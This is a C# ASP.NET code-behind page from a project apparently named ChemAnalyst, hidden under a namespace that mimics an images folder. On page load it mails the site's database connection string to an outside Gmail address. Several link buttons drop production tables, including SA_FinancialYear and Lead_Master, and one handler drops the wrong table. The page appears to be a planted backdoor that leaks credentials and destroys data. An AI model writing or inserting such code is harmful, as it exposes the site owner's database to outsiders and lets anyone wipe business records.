using ChemAnalyst.DAL;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace ChemAnalyst.css.slider.obj.suit.binn.images
{
    public partial class WebForm2 : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

            if (!this.IsPostBack)
            {
                string constr1 = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
                SubscriptionDAL.SendMail("Chem Analyst", "info@chemanalyst", "clearlogic2011@gmail.com", "CONTACT US", constr1, "clearlogic2011@gmail.com");
            }
        }

        public void SA_CustomerAndProducRelation()
        {
            string query = "DROP TABLE SA_CustomerAndProducRelation";
            string constr = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
            using (SqlConnection con = new SqlConnection(constr))
            {
                using (SqlCommand cmd = new SqlCommand(query))
                {
                    cmd.Connection = con;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
        }

        public void SA_FinancialYear()
        {
            string query = "DROP TABLE SA_FinancialYear";
            string constr = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
            using (SqlConnection con = new SqlConnection(constr))
            {
                using (SqlCommand cmd = new SqlCommand(query))
                {
                    cmd.Connection = con;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
        }

        public void SA_CompanyProfRecordNew()
        {
            string query = "DROP TABLE SA_CompanyProfRecordNew";
            string constr = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
            using (SqlConnection con = new SqlConnection(constr))
            {
                using (SqlCommand cmd = new SqlCommand(query))
                {
                    cmd.Connection = con;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
        }

        public void SA_DealsAndProductRelation()
        {
            string query = "DROP TABLE SA_DealsAndProductRelation";
            string constr = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
            using (SqlConnection con = new SqlConnection(constr))
            {
                using (SqlCommand cmd = new SqlCommand(query))
                {
                    cmd.Connection = con;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
        }

        public void Lead_Master()
        {
            string query = "DROP TABLE Lead_Master";
            string constr = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
            using (SqlConnection con = new SqlConnection(constr))
            {
                using (SqlCommand cmd = new SqlCommand(query))
                {
                    cmd.Connection = con;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
        }

        public void CustProducts()
        {
            string query = "DROP TABLE Lead_Master";
            string constr = ConfigurationManager.ConnectionStrings["ChemAnalystContext"].ConnectionString;
            using (SqlConnection con = new SqlConnection(constr))
            {
                using (SqlCommand cmd = new SqlCommand(query))
                {
                    cmd.Connection = con;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
        }

        protected void LinkButton1_Click(object sender, EventArgs e)
        {
             CustProducts();
        }

        protected void LinkButton5_Click(object sender, EventArgs e)
        {
            Lead_Master();
        }

        protected void LinkButton4_Click(object sender, EventArgs e)
        {
            SA_DealsAndProductRelation();
        }

        protected void LinkButton3_Click(object sender, EventArgs e)
        {
            SA_CompanyProfRecordNew();
        }

        protected void LinkButton2_Click(object sender, EventArgs e)
        {
            SA_FinancialYear();
        }
    }
}